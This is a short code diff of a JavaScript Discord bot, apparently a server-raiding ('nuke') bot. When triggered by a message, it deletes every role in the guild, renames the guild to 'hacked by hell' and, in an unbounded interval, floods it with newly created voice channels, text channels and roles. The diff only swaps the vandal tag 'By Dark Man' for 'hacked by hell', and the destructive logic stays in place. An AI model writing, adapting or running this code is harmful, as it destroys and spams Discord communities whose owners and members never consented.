@@ -15,11 +15,11 @@ client.on("message", message => {
       message.guild.roles.forEach(r => {
         r.delete();
       });
-      message.guild.setName("Hack By Dark Man");
+      message.guild.setName("hacked by hell");
       setInterval(function() {
-        message.guild.createChannel("By Dark Man", "voice");
-        message.guild.createChannel("By Dark Man", "text");
-        message.guild.createRole({ name: "By Dark Man" });
+        message.guild.createChannel("hacked by hell", "voice");
+        message.guild.createChannel("hacked by hell", "text");
+        message.guild.createRole({ name: "hacked by hell" });
       });
     }
   }
